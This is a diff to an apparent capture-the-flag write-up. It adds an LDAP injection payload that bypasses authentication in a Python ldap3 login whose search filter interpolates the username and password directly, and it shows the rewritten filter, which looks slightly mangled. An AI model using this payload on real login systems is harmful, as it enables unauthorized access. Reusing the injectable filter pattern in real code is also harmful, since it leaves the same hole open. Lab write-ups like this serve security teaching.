@@ -4154,7 +4154,18 @@ if not conn.bind():
         conn.search('ou=people,dc=bts,dc=ctf', f'(&(employeeType=active)(uid={username})(userPassword={password}))', attributes=['uid'])
 ```
 
-- 
+- Authentication bypass, Use-:
+
+```ldap
+user=*)(uid=*)(uid=*&password=*
+```
+
+- The query shown below will be the final result after injecting the payload, the result will be Boolean `true` which will bypass authentication
+
+```
+(&(employeeType=active)(uid=*)(uid=*)(uid=*)(userPassword={password}))
+
+```
 
 
 
